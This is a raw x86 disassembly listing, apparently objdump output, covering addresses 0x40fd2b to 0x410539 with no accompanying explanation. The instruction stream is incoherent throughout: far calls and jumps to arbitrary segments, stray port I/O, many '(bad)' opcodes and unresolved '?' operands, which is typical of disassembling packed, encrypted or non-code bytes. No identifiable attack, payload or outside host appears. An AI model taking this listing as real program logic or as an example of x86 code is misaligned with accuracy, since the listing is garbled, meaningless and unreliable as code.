  40fd2b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd2c:	mov    bh,bh
  40fd2e:	xchg   ecx,eax
  40fd2f:	shr    BYTE PTR [ecx-0x55],cl
  40fd32:	cmp    esi,DWORD PTR [ebx+0xf]
  40fd35:	aaa    
  40fd36:	inc    eax
  40fd37:	adc    cl,ch
  40fd39:	out    dx,al
  40fd3a:	push   cs
  40fd3b:	cli    
  40fd3c:	sbb    ah,ch
  40fd3e:	adc    BYTE PTR [ebx],cl
  40fd40:	adc    BYTE PTR [edx+ebp*4+0x55],al
  40fd44:	call   0x43d9:0x53e5942e
  40fd4b:	repnz xor eax,0xc94ebb16
  40fd51:	push   ebx
  40fd52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd53:	adc    al,0x58
  40fd55:	sub    cl,cl
  40fd57:	int    0x8c
  40fd59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd5a:	out    dx,al
  40fd5b:	mov    eax,ds:0x93187aca
  40fd60:	sub    BYTE PTR [ecx],ah
  40fd62:	cdq    
  40fd63:	repz sti 
  40fd65:	dec    ecx
  40fd66:	jne    0x40fdc2
  40fd68:	cwde   
  40fd69:	jmp    0x50eb:0x3319ac2b
  40fd70:	imul   ecx,DWORD PTR [edi-0x54],0xffffffa4
  40fd74:	loope  0x40fdb3
  40fd76:	int3   
  40fd77:	or     DWORD PTR [edx],ecx
  40fd79:	or     cl,BYTE PTR [edx-0x753350df]
  40fd7f:	and    DWORD PTR [edi+0x55321b3],ecx
  40fd85:	scas   eax,DWORD PTR es:[edi]
  40fd86:	js     0x40fd14
  40fd88:	mov    ch,0xf2
  40fd8a:	inc    bx
  40fd8c:	sub    bl,BYTE PTR [ebp-0x7d76f669]
  40fd92:	fistp  QWORD PTR [eax+0x52]
  40fd95:	xchg   edx,eax
  40fd96:	jns    0x40fdb8
  40fd98:	fimul  DWORD PTR [ecx]
  40fd9a:	push   es
  40fd9b:	dec    ebx
  40fd9c:	fadd   st(6),st
  40fd9e:	in     eax,dx
  40fd9f:	(bad)
  40fda4:	iret   
  40fda5:	ins    BYTE PTR es:[edi],dx
  40fda6:	adc    al,0x35
  40fda8:	inc    ebx
  40fda9:	fwait
  40fdaa:	inc    ebx
  40fdab:	cmp    DWORD PTR [eax+esi*2+0x59],edi
  40fdaf:	pop    esp
  40fdb0:	xchg   ecx,eax
  40fdb1:	xor    esi,edx
  40fdb3:	sbb    BYTE PTR [edi+0x62],ah
  40fdb6:	jmp    0xca6915a3
  40fdbb:	push   ds
  40fdbc:	mov    ecx,0xf41ad3d9
  40fdc1:	les    eax,FWORD PTR [edi-0x24e8f648]
  40fdc7:	inc    esi
  40fdc8:	add    bh,0x19
  40fdcb:	adc    eax,0x8e86caa0
  40fdd0:	mov    ebx,0x887bae48
  40fdd5:	push   0xf0fd2b78
  40fdda:	mov    ecx,0x82aa8d54
  40fddf:	dec    ecx
  40fde0:	and    al,BYTE PTR [edi-0x6f00d3f8]
  40fde6:	mov    bh,0xb8
  40fde8:	les    edx,FWORD PTR [ecx-0x5d]
  40fdeb:	call   0xd7e5:0x999c5a00
  40fdf2:	js     0x40fe03
  40fdf4:	int    0xbf
  40fdf6:	sub    BYTE PTR [eax-0x3776a1f6],bl
  40fdfc:	enter  0x17eb,0xaa
  40fe00:	pusha  
  40fe01:	xor    al,0x41
  40fe03:	je     0x40fe3b
  40fe05:	fadd   st,st(0)
  40fe07:	shl    BYTE PTR [eax+0x1b],1
  40fe0a:	xor    al,0x81
  40fe0c:	test   DWORD PTR [ebx+ebx*1-0x257ed4c],eax
  40fe13:	jmp    0xb401:0x28e054ff
  40fe1a:	mov    ebp,DWORD PTR [ebp+0x59c5bff9]
  40fe20:	mov    esi,0x7f832142
  40fe25:	sbb    esp,esp
  40fe27:	mov    esp,0xcf4b68c
  40fe2c:	gs pop ecx
  40fe2e:	mov    esp,0x75ade54d
  40fe33:	aad    0xb9
  40fe35:	cmp    eax,0x7ef8f33d
  40fe3a:	test   DWORD PTR [ecx+0x172754b8],esi
  40fe40:	into   
  40fe41:	fisubr DWORD PTR [esi+0x167c17f1]
  40fe47:	add    eax,0x5e09937
  40fe4c:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  40fe4e:	xchg   cl,bh
  40fe50:	out    dx,eax
  40fe51:	cmp    BYTE PTR [edx],0x2
  40fe54:	out    dx,eax
  40fe55:	jae    0x40fe0e
  40fe57:	aas    
  40fe58:	or     eax,0xc318849d
  40fe5d:	cwde   
  40fe5e:	push   ecx
  40fe5f:	je     0x40fe88
  40fe61:	inc    eax
  40fe62:	aaa    
  40fe63:	imul   esp,ebx,0x3d57b4b9
  40fe69:	mov    ah,0x9b
  40fe6b:	rcl    BYTE PTR [edi],cl
  40fe6d:	test   edx,ebp
  40fe6f:	dec    ebp
  40fe70:	shl    ecx,cl
  40fe72:	js     0x40fe67
  40fe74:	or     ebp,DWORD PTR cs:[edx]
  40fe77:	adc    BYTE PTR [eax],ch
  40fe79:	call   0x5ee9:0xc0840361
  40fe80:	dec    esi
  40fe81:	cld    
  40fe82:	xor    DWORD PTR [eax],0xfe282c24
  40fe88:	cmp    DWORD PTR [ebp-0x25],0xfffffff7
  40fe8c:	xchg   edi,eax
  40fe8d:	pop    edx
  40fe8e:	inc    ebp
  40fe8f:	dec    esi
  40fe90:	retf   
  40fe91:	in     eax,0x2a
  40fe93:	jno    0x40fe59
  40fe95:	jecxz  0x40fe2e
  40fe97:	mov    al,ds:0x882afbae
  40fe9c:	sub    al,0xc
  40fe9e:	dec    esp
  40fe9f:	mov    al,ds:0x6c9081a8
  40fea4:	jle    0x40fe76
  40fea6:	xlat   BYTE PTR ds:[ebx]
  40fea7:	mov    ds:0x756da4c4,al
  40feac:	inc    esi
  40fead:	dec    esp
  40feae:	inc    edx
  40feaf:	retf   0xfbca
  40feb2:	sbb    DWORD PTR [ecx+0x18],0xffffffb2
  40feb6:	mov    edi,0xf9fcf63b
  40febb:	push   es
  40febc:	mov    edi,0xc300ca9c
  40fec1:	test   eax,0xd81c5b7
  40fec6:	int    0xc6
  40fec8:	dec    ebx
  40fec9:	xor    al,0xc5
  40fecb:	imul   al
  40fecd:	push   edi
  40fece:	fld    DWORD PTR [ebx+0x0]
  40fed1:	mov    BYTE PTR [ecx-0x36288c50],bh
  40fed7:	int3   
  40fed8:	ror    BYTE PTR [edi+0x2a6fe5cf],cl
  40fede:	es and bl,ch
  40fee1:	cmp    edx,0x51ea9d02
  40fee7:	ss inc ebp
  40fee9:	scas   eax,DWORD PTR es:[edi]
  40feea:	mov    esi,0x836bfe00
  40feef:	mov    ebp,0x42b664bf
  40fef4:	jmp    0x651534c1
  40fef9:	(bad)  
  40fefa:	test   ch,0x4
  40fefd:	imul   eax,DWORD PTR [eax],0xffffffd8
  40ff00:	jns    0x40fe96
  40ff02:	adc    eax,0xdbdd116b
  40ff07:	sti    
  40ff08:	je     0x40ff81
  40ff0a:	and    DWORD PTR [edi+ebp*2-0x55],ebx
  40ff0e:	jl     0x40feff
  40ff10:	popa   
  40ff11:	push   edx
  40ff12:	nop
  40ff13:	les    ecx,FWORD PTR [edx-0x6f14a59c]
  40ff19:	adc    dh,cl
  40ff1b:	jge    0x40ff37
  40ff1d:	mov    ds:0x4e7d735a,eax
  40ff22:	push   ecx
  40ff23:	sbb    eax,0x609ae765
  40ff28:	xor    DWORD PTR [edi],0xd6111a53
  40ff2e:	mov    edx,0x4c29b1ce
  40ff33:	mov    edi,DWORD PTR [ebx+0x3d]
  40ff36:	pop    ss
  40ff37:	jb     0x40ff69
  40ff39:	addr16 test eax,0xd146830e
  40ff3f:	mov    eax,0xd15e4f9a
  40ff44:	lock mov dh,0xb0
  40ff47:	cmc    
  40ff48:	(bad)  
  40ff49:	fisubr DWORD PTR [ebx-0x79a31499]
  40ff4f:	sbb    eax,0x3f568252
  40ff54:	enter  0x2880,0x6d
  40ff58:	mov    esi,0x7dfda3f1
  40ff5d:	stos   DWORD PTR es:[edi],eax
  40ff5e:	or     ebx,DWORD PTR [eax]
  40ff60:	lahf   
  40ff61:	fldenv [edi]
  40ff63:	and    DWORD PTR [ebx+0x37d73cb7],esp
  40ff69:	pop    edx
  40ff6a:	out    dx,eax
  40ff6b:	ins    BYTE PTR es:[edi],dx
  40ff6c:	into   
  40ff6d:	(bad)  
  40ff6e:	jp     0x40ffd0
  40ff70:	add    edx,0xffffff97
  40ff73:	jl     0x40ff0d
  40ff75:	xchg   DWORD PTR [edx],esi
  40ff77:	mov    cl,0xe7
  40ff79:	repnz pop ds
  40ff7b:	xchg   ebp,eax
  40ff7c:	mov    dh,BYTE PTR [edx]
  40ff7e:	push   0xffffffed
  40ff80:	sub    DWORD PTR [edi],esi
  40ff82:	fcom   DWORD PTR [esi]
  40ff84:	dec    ebp
  40ff85:	enter  0x6e86,0x15
  40ff89:	push   ecx
  40ff8a:	add    eax,0x6450da0e
  40ff8f:	add    DWORD PTR [eax+0x60],eax
  40ff92:	int3   
  40ff93:	fnclex 
  40ff95:	pop    ebp
  40ff96:	adc    ah,BYTE PTR [esi-0x34]
  40ff99:	out    0x61,al
  40ff9b:	outs   dx,DWORD PTR ds:[esi]
  40ff9c:	push   eax
  40ff9d:	popf   
  40ff9e:	push   edx
  40ff9f:	or     BYTE PTR [ecx+ebx*1+0x2],dl
  40ffa3:	fsubr  DWORD PTR [eax+0x6f]
  40ffa6:	js     0x40ffad
  40ffa8:	rcl    al,1
  40ffaa:	js     0x40ff8e
  40ffac:	push   es
  40ffad:	pop    edx
  40ffae:	call   0x80224e63
  40ffb3:	sar    ebp,0x37
  40ffb6:	xchg   edi,eax
  40ffb7:	add    al,0x55
  40ffb9:	arpl   WORD PTR [ebp+eiz*2+0x51248ab4],ax
  40ffc0:	push   ss
  40ffc1:	pop    ss
  40ffc2:	cli    
  40ffc3:	xor    eax,0x2abe2c70
  40ffc8:	aaa    
  40ffc9:	or     cl,BYTE PTR [eax]
  40ffcb:	stc    
  40ffcc:	fdivr  DWORD PTR [ebx+0x71]
  40ffcf:	imul   esi,DWORD PTR [esi],0x65
  40ffd2:	pusha  
  40ffd3:	fld    QWORD PTR [eax-0x4d]
  40ffd6:	iret   
  40ffd7:	(bad)  
  40ffd8:	out    dx,al
  40ffd9:	jnp    0x40ffc8
  40ffdb:	cli    
  40ffdc:	shr    BYTE PTR [edx],cl
  40ffde:	int    0x15
  40ffe0:	fcomp  QWORD PTR [ecx]
  40ffe2:	lahf   
  40ffe3:	and    DWORD PTR [eax],ecx
  40ffe5:	rol    BYTE PTR ds:0xd04e56e2,1
  40ffeb:	pop    edi
  40ffec:	xchg   esp,eax
  40ffed:	cmp    ch,BYTE PTR [edi-0x14]
  40fff0:	jae    0x40ff9e
  40fff2:	adc    esi,DWORD PTR [ebp-0x3cb56aea]
  40fff8:	xchg   esp,eax
  40fff9:	inc    ecx
  40fffa:	and    eax,0xe6e74046
  40ffff:	sub    bh,BYTE PTR [esi]
  410001:	push   cs
  410002:	popa   
  410003:	fsubr  DWORD PTR [edi+0x1b]
  410006:	inc    edx
  410007:	out    dx,al
  410008:	and    dl,BYTE PTR [ecx+0x7d6ad15f]
  41000e:	sbb    bl,al
  410010:	cmovno edi,DWORD PTR [ecx]
  410013:	or     BYTE PTR ds:0xd6753e95,al
  410019:	sbb    DWORD PTR [eax],ebx
  41001b:	shr    BYTE PTR [edx],0x29
  41001e:	lods   al,BYTE PTR ds:[esi]
  41001f:	push   ss
  410020:	fs and eax,0x504295bd
  410026:	mov    ecx,0x2275313c
  41002b:	mov    al,ds:0x6134a283
  410030:	xor    DWORD PTR [esi+0xd484471],ecx
  410036:	cld    
  410037:	jg     0x4100ae
  410039:	sbb    DWORD PTR [esi],edi
  41003b:	jg     0x40ffcb
  41003d:	add    eax,0x363fd078
  410042:	repz imul eax,DWORD PTR [ebx],0xec6a2aeb
  410049:	push   eax
  41004a:	daa    
  41004b:	jg     0x41008c
  41004d:	bnd jmp 0x410057
  410050:	sbb    eax,0xbd21709b
  410055:	lea    eax,[ecx]
  410057:	xchg   DWORD PTR [esi],edx
  410059:	adc    eax,0x80626e5f
  41005e:	or     eax,0xf567a4e4
  410063:	jbe    0x41001b
  410065:	popf   
  410066:	mov    ds:0xa3fd6e,eax
  41006b:	xor    al,al
  41006d:	xchg   edx,eax
  41006e:	dec    esi
  41006f:	pop    es
  410070:	gs and eax,0x20a9e3dc
  410076:	jnp    0x41007a
  410078:	push   esi
  410079:	leave  
  41007a:	test   al,0x6e
  41007c:	ds jg  0x410057
  41007f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410080:	bound  esp,QWORD PTR [ebx-0x2b297166]
  410086:	loopne 0x4100ac
  410088:	adc    eax,0x833a705f
  41008d:	add    eax,0xb0a9df9e
  410092:	in     al,0xf4
  410094:	cli    
  410095:	sub    dh,dl
  410097:	rol    BYTE PTR [edi+edi*2+0x57493fa9],0x1
  41009f:	push   eax
  4100a0:	jge    0x41008d
  4100a2:	rcr    BYTE PTR [esi-0x76d3bb2f],1
  4100a8:	js     0x410108
  4100aa:	pushf  
  4100ab:	cdq    
  4100ac:	mov    ds:0x771f8c53,eax
  4100b1:	mov    al,0x18
  4100b3:	or     BYTE PTR [esi+0x52],cl
  4100b6:	aaa    
  4100b7:	bound  ebp,QWORD PTR [ebp+esi*4+0x70]
  4100bb:	jg     0x410069
  4100bd:	pop    ds
  4100be:	push   es
  4100bf:	(bad)  
  4100c0:	scas   al,BYTE PTR es:[edi]
  4100c1:	sub    eax,0x29aa11a1
  4100c6:	test   DWORD PTR [edx-0x6550d13a],edi
  4100cc:	inc    ecx
  4100cd:	popa   
  4100ce:	adc    eax,0x41675170
  4100d3:	in     al,0x34
  4100d5:	inc    eax
  4100d6:	jecxz  0x4100f6
  4100d8:	aaa    
  4100d9:	push   esi
  4100da:	xlat   BYTE PTR ds:[ebx]
  4100db:	in     al,0xb1
  4100dd:	push   cs
  4100de:	(bad)  
  4100df:	out    0xc3,al
  4100e1:	sbb    al,0x11
  4100e3:	inc    esp
  4100e4:	retf   0x3319
  4100e7:	push   edx
  4100e8:	call   0xc335:0x6ce4d562
  4100ef:	mov    edx,0xe4a42cf3
  4100f4:	push   esi
  4100f5:	inc    edx
  4100f6:	adc    BYTE PTR [edx-0x55d3d13a],dl
  4100fc:	test   eax,0xb06da0cc
  410101:	pop    edx
  410102:	std    
  410103:	out    0xca,al
  410105:	jle    0x410167
  410107:	mov    ah,0xbe
  410109:	jo     0x410159
  41010b:	addr16 cli 
  41010d:	push   ebp
  41010e:	xor    ebp,0x2a9f7373
  410114:	imul   ecx,DWORD PTR [eax],0x4650a598
  41011a:	dec    eax
  41011b:	cld    
  41011c:	imul   eax,DWORD PTR [ecx],0xffffffa8
  41011f:	mov    dl,0xd7
  410121:	icebp  
  410122:	xchg   ebx,eax
  410123:	cbw    
  410125:	pop    ebp
  410126:	add    al,0x58
  410128:	add    ecx,DWORD PTR [eax-0x73f638a8]
  41012e:	xchg   BYTE PTR [ebp+0x22],dh
  410131:	in     al,0xdb
  410133:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410134:	out    0x2d,eax
  410136:	xor    edx,DWORD PTR [esi+0x7a]
  410139:	jno    0x410102
  41013b:	or     eax,0x7db235e1
  410140:	dec    esi
  410141:	stc    
  410142:	or     esp,DWORD PTR [eax]
  410144:	leave  
  410145:	push   edi
  410146:	je     0x4100c8
  410148:	push   edi
  410149:	add    al,0xe5
  41014b:	jns    0x4100e6
  41014d:	mov    ds:0xd43b6962,al
  410152:	nop
  410153:	test   eax,0x8077190f
  410158:	jno    0x4100ec
  41015a:	cmp    eax,0x8ed9bde5
  41015f:	xor    al,0x36
  410161:	rol    ebp,cl
  410163:	inc    ebx
  410164:	iret   
  410165:	fwait
  410166:	repz jmp 0x57f10666
  41016c:	retf   
  41016d:	push   0x24e6c5c0
  410172:	(bad)  
  410173:	loopne 0x410103
  410175:	xchg   DWORD PTR [ecx+esi*8],edi
  410178:	or     eax,0x42592d91
  41017d:	mov    edx,0xe2cf0085
  410182:	push   esi
  410183:	jmp    0x819c:0xc92e0638
  41018a:	jecxz  0x4101ea
  41018c:	xor    DWORD PTR [edi+0x75],ebp
  41018f:	or     al,0xf6
  410191:	jo     0x41020e
  410193:	mov    dh,ah
  410195:	loopne 0x41016a
  410197:	out    0x51,al
  410199:	loope  0x4101fb
  41019b:	jg     0x4101fd
  41019d:	push   edx
  41019e:	xor    dh,BYTE PTR [ebx-0x6]
  4101a1:	dec    eax
  4101a2:	mov    ds:0xc8b15dc4,al
  4101a7:	loope  0x41018f
  4101a9:	add    DWORD PTR [eax+0x11],esp
  4101ac:	imul   DWORD PTR [edx]
  4101ae:	retf   
  4101af:	xor    DWORD PTR [ebp-0x1e],ebx
  4101b2:	adc    eax,0xffa5869
  4101b7:	fsubr  QWORD PTR [ebp+0x1e]
  4101ba:	loopne 0x410232
  4101bc:	jbe    0x4101c9
  4101be:	or     esi,edx
  4101c0:	fist   DWORD PTR [eax-0x73]
  4101c3:	inc    ebx
  4101c4:	fucomip st,st(4)
  4101c6:	xchg   edi,eax
  4101c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101c8:	push   es
  4101c9:	scas   eax,DWORD PTR es:[edi]
  4101ca:	int    0xe4
  4101cc:	cdq    
  4101cd:	sub    eax,esp
  4101cf:	loope  0x410176
  4101d1:	call   0xef01f6d9
  4101d6:	mov    ebp,0xe32b5c13
  4101db:	xor    DWORD PTR [edx],ecx
  4101dd:	enter  0x1a52,0x9d
  4101e1:	or     al,0x7d
  4101e3:	jmp    0x9c33:0xadd8ba4
  4101ea:	out    dx,eax
  4101eb:	call   0x225c9f54
  4101f0:	lods   al,BYTE PTR ds:[esi]
  4101f1:	loop   0x41023b
  4101f3:	icebp  
  4101f4:	fisubr DWORD PTR [ecx-0x4c2b3c30]
  4101fa:	cmc    
  4101fb:	jl     0x4101f8
  4101fd:	inc    esi
  4101fe:	inc    edx
  4101ff:	aam    0x29
  410201:	or     bh,BYTE PTR [ebx]
  410203:	sbb    ch,BYTE PTR ds:0xdd78bcf7
  410209:	stos   BYTE PTR es:[edi],al
  41020a:	jne    0x410213
  41020c:	jno    0x410216
  41020e:	sbb    BYTE PTR [eax-0x455203d5],ch
  410214:	mov    eax,ds:0x153cec81
  410219:	stos   DWORD PTR es:[edi],eax
  41021a:	call   0x1f8e:0xdbb18509
  410221:	mov    ?,eax
  410223:	push   0x63ea402a
  410228:	mov    ebx,0x3f22d005
  41022d:	or     DWORD PTR [eax+0x7b3c7d24],0xffffffef
  410234:	mov    al,0x14
  410236:	fnop   
  410238:	mov    edx,gs
  41023a:	dec    ecx
  41023b:	leave  
  41023c:	xchg   esi,eax
  41023d:	jnp    0x410276
  41023f:	mov    cl,0xa5
  410241:	push   ecx
  410242:	pusha  
  410243:	push   ebp
  410244:	cmp    bl,BYTE PTR [edi]
  410246:	test   DWORD PTR [eax],esp
  410248:	jg     0x41020c
  41024a:	jns    0x410273
  41024c:	xor    ebx,DWORD PTR [edx+ecx*8]
  41024f:	lds    ebx,FWORD PTR [esi+0x69571285]
  410255:	or     eax,0x86309116
  41025a:	dec    ebp
  41025b:	mov    ecx,0x8f816926
  410260:	dec    esp
  410261:	std    
  410262:	aaa    
  410263:	lock arpl WORD PTR [ecx+0x59bbd002],di
  41026a:	push   cs
  41026b:	add    bl,ah
  41026d:	lock ds inc ebx
  410270:	out    0x4,eax
  410272:	sahf   
  410273:	and    eax,ecx
  410275:	out    0x57,al
  410277:	dec    ecx
  410278:	cmp    eax,0xf4cd2696
  41027d:	fbstp  TBYTE PTR [edi+0x5c289048]
  410283:	stc    
  410284:	mov    ecx,0x86161b37
  410289:	imul   edi,esi,0xf53a1648
  41028f:	dec    edx
  410290:	(bad)  
  410291:	dec    esp
  410292:	aad    0xd9
  410294:	in     al,dx
  410295:	nop
  410296:	test   al,0x4d
  410298:	outs   dx,BYTE PTR ds:[esi]
  410299:	xchg   edi,eax
  41029a:	add    eax,0x6c06219f
  41029f:	fisttp WORD PTR [ebp-0x70]
  4102a2:	jecxz  0x41031c
  4102a4:	cmc    
  4102a5:	fscale 
  4102a7:	in     al,0xc2
  4102a9:	inc    edx
  4102aa:	int    0xdb
  4102ac:	jb     0x4102c2
  4102ae:	shl    DWORD PTR [edx-0x12ece1d],cl
  4102b4:	xorps  xmm7,XMMWORD PTR [edi+0x5]
  4102b8:	xor    eax,0x56f8d8e6
  4102bd:	js     0x41025b
  4102bf:	addr16 dec esi
  4102c1:	mov    al,ds:0x42c2b457
  4102c6:	dec    ebp
  4102c7:	stc    
  4102c8:	daa    
  4102c9:	mov    ecx,0x826ecd99
  4102ce:	clc    
  4102cf:	in     al,dx
  4102d0:	out    0x8,al
  4102d2:	pop    eax
  4102d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4102d4:	push   ebp
  4102d5:	in     al,0x54
  4102d7:	stc    
  4102d8:	ret    
  4102d9:	dec    ecx
  4102da:	inc    ebx
  4102db:	sub    al,0x65
  4102dd:	mov    esi,0x7533361a
  4102e2:	pop    ecx
  4102e3:	mov    DWORD PTR [edx],edi
  4102e5:	out    0xba,al
  4102e7:	sbb    al,0xb5
  4102e9:	out    dx,eax
  4102ea:	mov    dl,0xc9
  4102ec:	sub    eax,0x2a46b7b4
  4102f1:	div    BYTE PTR [esi+0x735e1c04]
  4102f7:	sahf   
  4102f8:	xor    DWORD PTR [eax+ebx*8],0x572444f0
  4102ff:	in     eax,dx
  410300:	pop    edx
  410301:	sub    dl,BYTE PTR [eax-0x34]
  410304:	in     al,0xe7
  410306:	inc    esi
  410307:	cdq    
  410308:	jmp    0xbad5:0x40632434
  41030f:	jo     0x410378
  410311:	and    eax,0x1127432e
  410316:	pop    ds
  410317:	fcomp  DWORD PTR [ecx+0x169111bd]
  41031d:	hlt    
  41031e:	scas   al,BYTE PTR es:[edi]
  41031f:	mov    esi,0x3ab5a270
  410324:	nop
  410325:	test   DWORD PTR [bp+di],ebx
  410328:	mov    ecx,0xf3a6879b
  41032d:	push   edi
  41032e:	mov    dh,0xaa
  410330:	pop    ebx
  410331:	dec    eax
  410332:	(bad)  
  410333:	sub    ah,bl
  410335:	sbb    dh,BYTE PTR [edx+0x357993b1]
  41033b:	adc    eax,0x18b5c9f0
  410340:	or     BYTE PTR [ebx+ebp*2-0x64646dd4],cl
  410347:	inc    eax
  410348:	and    eax,0x133b6077
  41034d:	stc    
  41034e:	ins    BYTE PTR es:[edi],dx
  41034f:	jecxz  0x410329
  410351:	pop    edx
  410352:	loope  0x41034a
  410354:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410355:	cmp    DWORD PTR [edi],0x68
  410358:	mov    ah,BYTE PTR [edi]
  41035a:	or     DWORD PTR [ebp+eax*8-0x6d8ba187],ebp
  410361:	mov    al,ds:0xad675cb2
  410366:	xchg   DWORD PTR [esi+0x1e],esp
  410369:	pop    ss
  41036a:	retf   
  41036b:	loope  0x410344
  41036d:	pop    eax
  41036e:	imul   eax,esi,0x2e6983df
  410374:	push   edx
  410375:	mov    edi,0xfcfcc2fc
  41037a:	pop    es
  41037b:	por    mm1,QWORD PTR [esi-0x3dc573dd]
  410382:	cmp    BYTE PTR [ecx-0x13],0xe
  410386:	fcomp  st(6)
  410388:	imul   edi,edx,0x2d
  41038b:	out    dx,eax
  41038c:	xor    ah,0x13
  41038f:	or     eax,0x857dbc02
  410394:	dec    eax
  410395:	mov    al,ds:0xaf34c7e5
  41039a:	inc    esp
  41039b:	or     ebx,DWORD PTR [ecx]
  41039d:	mov    ebx,0x69b6758d
  4103a2:	add    bh,BYTE PTR [ecx]
  4103a4:	call   DWORD PTR [ecx-0x25334e9d]
  4103aa:	and    ch,BYTE PTR [eax+0x44]
  4103ad:	out    dx,al
  4103ae:	mov    ebp,0xd641afa
  4103b3:	jne    0x410357
  4103b5:	out    0x33,eax
  4103b7:	push   ecx
  4103b8:	or     edi,DWORD PTR [eax]
  4103ba:	xor    esp,DWORD PTR [eax]
  4103bc:	xor    DWORD PTR [edx-0x57],esi
  4103bf:	mov    esp,DWORD PTR [ebp-0x66]
  4103c2:	fwait
  4103c3:	xchg   ebp,eax
  4103c4:	not    BYTE PTR [ebp-0x48]
  4103c7:	(bad)  
  4103c8:	call   0xba00:0xe27e4a93
  4103cf:	add    BYTE PTR [ebx],bl
  4103d1:	adc    ebp,0x4fa2cdbc
  4103d7:	sar    DWORD PTR [eax+0x0],cl
  4103da:	cli    
  4103db:	call   0x17bd:0xbf2b1447
  4103e2:	mov    dh,0xc3
  4103e4:	xchg   ecx,eax
  4103e5:	fidiv  DWORD PTR [eax-0x30]
  4103e8:	xchg   esi,eax
  4103e9:	push   esp
  4103ea:	jmp    0xe81250cb
  4103ef:	sbb    ah,BYTE PTR [eax+0x41]
  4103f2:	fmul   QWORD PTR [ecx]
  4103f4:	sub    eax,0x80c5a181
  4103f9:	xchg   esp,eax
  4103fa:	pushf  
  4103fb:	enter  0x305c,0x6d
  4103ff:	pusha  
  410400:	pop    eax
  410401:	push   edx
  410402:	push   cs
  410403:	cwde   
  410404:	lods   al,BYTE PTR ds:[esi]
  410405:	inc    esi
  410406:	imul   ebx,DWORD PTR [eax+0x2d1bf541],0x7b2c8d99
  410410:	in     al,0x32
  410412:	int    0x3
  410414:	sub    al,0x7e
  410416:	xchg   DWORD PTR [edi],eax
  410418:	shr    DWORD PTR [esi],cl
  41041a:	mov    DWORD PTR [eax],0x45961a2a
  410420:	pop    ss
  410421:	xchg   edx,eax
  410422:	cli    
  410423:	mov    al,BYTE PTR [ebp+0x46c96981]
  410429:	fst    st(4)
  41042b:	rcr    BYTE PTR [eax+0xc],0x2
  41042f:	ss sahf 
  410431:	xor    BYTE PTR [esi+0x5b],dl
  410434:	xor    BYTE PTR [edx+0x23836a54],dl
  41043a:	fimul  WORD PTR fs:[edx]
  41043d:	out    0xd9,eax
  41043f:	pop    ebx
  410440:	nop
  410441:	dec    edx
  410442:	inc    edx
  410443:	rcl    BYTE PTR [edi-0x16379759],1
  410449:	daa    
  41044a:	mov    bl,0x24
  41044c:	mov    dh,0x2e
  41044e:	fsub   DWORD PTR [edx+0x2e19262e]
  410455:	ror    ch,cl
  410457:	xchg   edx,eax
  410458:	retf   0x2a95
  41045b:	jmp    0xf76062b3
  410460:	(bad)  
  410461:	dec    esi
  410462:	xor    eax,0x166e2114
  410467:	aaa    
  410468:	ja     0x410414
  41046a:	and    eax,0x99f70918
  41046f:	mov    esi,DWORD PTR [ebp-0xb]
  410472:	mov    ?,WORD PTR [edx-0xd]
  410475:	mov    esp,0xf0b376ae
  41047a:	mov    ah,0x68
  41047c:	lods   eax,DWORD PTR ds:[esi]
  41047d:	pusha  
  41047e:	and    ecx,DWORD PTR [edx+ebx*4-0x5d]
  410482:	cwde   
  410483:	xchg   esi,eax
  410484:	mov    bh,0x5f
  410486:	jge    0x4104fe
  410488:	push   cs
  410489:	out    dx,al
  41048a:	out    0xec,al
  41048c:	inc    esp
  41048d:	stos   DWORD PTR es:[edi],eax
  41048e:	sti    
  41048f:	mov    ds,WORD PTR [esi]
  410491:	popf   
  410492:	test   DWORD PTR [edi+0x56],ebp
  410495:	and    edi,edi
  410497:	adc    eax,0xf5f07416
  41049c:	push   0xffffffc4
  41049e:	inc    eax
  41049f:	xchg   ebp,eax
  4104a0:	cmp    dl,BYTE PTR [edx+0x5a]
  4104a3:	sbb    eax,0x42a24c4a
  4104a8:	cli    
  4104a9:	or     DWORD PTR [edi],eax
  4104ab:	pop    ss
  4104ac:	popf   
  4104ad:	jmp    0x410433
  4104af:	mov    BYTE PTR [ecx],ch
  4104b1:	jmp    0x39472b0b
  4104b6:	(bad)  
  4104b7:	das    
  4104b8:	dec    esp
  4104b9:	mov    esp,0x19141de1
  4104be:	jp     0x410504
  4104c0:	dec    esp
  4104c1:	retf   0x1db2
  4104c4:	test   DWORD PTR [ebx-0x6d],0x51caa5b1
  4104cb:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  4104cd:	pop    eax
  4104ce:	cdq    
  4104cf:	bnd jge 0x410529
  4104d2:	pop    ebx
  4104d3:	mov    ch,0xca
  4104d5:	(bad)  
  4104d6:	rol    DWORD PTR [edx-0x7d25b740],1
  4104dc:	cs pusha 
  4104de:	outs   dx,DWORD PTR ds:[esi]
  4104df:	in     al,dx
  4104e0:	imul   ebx,DWORD PTR [edi-0x5f94b002],0x5941ef33
  4104ea:	sub    DWORD PTR [edi],0xe6a1f5c4
  4104f0:	ficomp DWORD PTR [edx]
  4104f2:	loop   0x410531
  4104f4:	xchg   ebp,eax
  4104f5:	add    al,0x5e
  4104f7:	mov    bh,0x5
  4104f9:	mov    ah,0x6
  4104fb:	mov    edx,0xa980009b
  410500:	fdiv   st(6),st
  410502:	aaa    
  410503:	add    BYTE PTR [eax],dh
  410505:	data16 adc cl,BYTE PTR [edx+0x24]
  410509:	cmp    eax,0x9d44e398
  41050e:	(bad)  
  41050f:	mov    esp,0x8dd1906b
  410514:	les    esp,FWORD PTR [ebx+0x4d]
  410517:	jb     0x4104f6
  410519:	lock dec edi
  41051b:	gs push 0x70
  41051e:	les    ecx,FWORD PTR [edi-0x39]
  410521:	sahf   
  410522:	dec    edx
  410523:	cld    
  410524:	inc    esp
  410525:	lea    eax,[eax+0x4b1ade97]
  41052b:	inc    ecx
  41052c:	ins    DWORD PTR es:[edi],dx
  41052d:	jo     0x410514
  41052f:	nop
  410530:	dec    eax
  410531:	mov    cl,dl
  410533:	loop   0x410507
  410535:	adc    al,0x12
  410537:	mov    es,ecx
  410539:	loope  0x410513
